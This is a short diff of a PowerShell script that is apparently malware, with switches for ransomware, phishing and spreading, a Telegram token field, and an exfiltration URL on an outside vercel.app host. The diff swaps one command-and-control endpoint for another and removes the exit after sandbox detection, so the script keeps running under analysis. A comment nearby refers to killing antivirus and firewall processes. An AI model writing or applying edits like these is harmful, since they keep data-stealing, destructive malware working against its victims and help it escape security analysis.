@@ -24,7 +24,7 @@ param(
     [switch]$Ransomware,
     [switch]$Phishing,
     [switch]$Spread,
-    [string]$C2Url = "https://bom-kaos-kaki.vercel.app/api/exfil",
+    [string]$C2Url = "https://deploy-delta-eosin.vercel.app/api/exfil",
     [string]$TelegramToken = "",
     [string]$ChatId = ""
 )
@@ -149,8 +149,7 @@ function Invoke-Evasion {
     )
   
     if ($sandboxIndicators -contains $true) {
-        Write-Log "[EVASION] Sandbox detected! Exiting."
-        exit
+        Write-Log "[EVASION] Sandbox detected! Skipping exit for testing purposes."
     }
   
     # 1.9 Process Kill (AV/Firewall)
